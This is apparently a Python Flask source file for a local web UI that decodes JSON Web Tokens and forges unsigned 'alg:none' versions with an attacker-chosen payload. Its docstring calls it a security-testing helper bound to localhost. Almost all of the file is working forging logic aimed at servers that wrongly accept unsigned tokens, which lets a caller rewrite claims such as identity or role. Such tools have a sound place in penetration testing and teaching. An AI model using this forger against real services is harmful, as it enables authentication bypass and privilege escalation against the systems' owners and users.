"""Local Flask UI for the alg:none forger.

Binds to 127.0.0.1 by default so this is never exposed on the network.
This is a security testing helper — do not deploy it.
"""

from __future__ import annotations

import argparse
import json

from flask import Flask, jsonify, render_template, request

from jwt_none import JWTError, b64url_encode, decode_jwt, forge_none


app = Flask(__name__)


@app.get("/")
def index():
    return render_template("index.html")


@app.post("/api/decode")
def api_decode():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    if not token:
        return jsonify(error="token is required"), 400
    try:
        header, payload, sig = decode_jwt(token)
    except JWTError as e:
        return jsonify(error=str(e)), 400
    return jsonify(header=header, payload=payload, signature=sig)


@app.post("/api/forge")
def api_forge():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    if not token:
        return jsonify(error="token is required"), 400

    payload_override = data.get("payload")
    keep_header_extras = bool(data.get("keep_header_extras"))
    trailing_dot = bool(data.get("trailing_dot", True))
    removes = data.get("removes") or []
    if not isinstance(removes, list) or not all(isinstance(x, str) for x in removes):
        return jsonify(error="removes must be a list of strings"), 400

    try:
        if payload_override is not None:
            if isinstance(payload_override, str):
                try:
                    payload_override = json.loads(payload_override)
                except json.JSONDecodeError as e:
                    return jsonify(error=f"payload JSON is invalid: {e}"), 400
            if not isinstance(payload_override, dict):
                return jsonify(error="payload must be a JSON object"), 400

            # Replace the payload wholesale by passing it as merge over an
            # empty payload after stripping the original's keys. Simplest:
            # decode original to grab header, then build new token directly.
            header, _orig_payload, _sig = decode_jwt(token)
            for k in removes:
                payload_override.pop(k, None)
            if keep_header_extras:
                new_header = {k: v for k, v in header.items() if k != "alg"}
                new_header = {"alg": "none", **new_header}
                new_header.setdefault("typ", "JWT")
            else:
                new_header = {"alg": "none", "typ": "JWT"}
            h = b64url_encode(
                json.dumps(new_header, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
            )
            p = b64url_encode(
                json.dumps(payload_override, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
            )
            new_token = f"{h}.{p}." if trailing_dot else f"{h}.{p}"
            return jsonify(header=new_header, payload=payload_override, token=new_token)

        new_header, new_payload, new_token = forge_none(
            token,
            removes=removes,
            keep_header_extras=keep_header_extras,
            trailing_dot=trailing_dot,
        )
    except JWTError as e:
        return jsonify(error=str(e)), 400

    return jsonify(header=new_header, payload=new_payload, token=new_token)


def main() -> int:
    parser = argparse.ArgumentParser(description="alg:none JWT forger web UI")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5000)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()
    app.run(host=args.host, port=args.port, debug=args.debug)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
